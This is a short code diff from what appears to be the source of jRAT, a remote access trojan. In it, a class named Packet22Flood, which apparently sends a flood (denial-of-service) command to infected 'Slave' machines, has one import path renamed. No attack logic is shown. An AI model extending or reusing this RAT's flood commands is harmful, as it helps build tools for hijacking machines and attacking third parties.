@@ -3,8 +3,8 @@ package pro.jrat.packets.outgoing;
 import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
+import pro.jrat.common.Flood;
 
-import com.redpois0n.common.Flood;
 
 public class Packet22Flood extends AbstractOutgoingPacket {
 
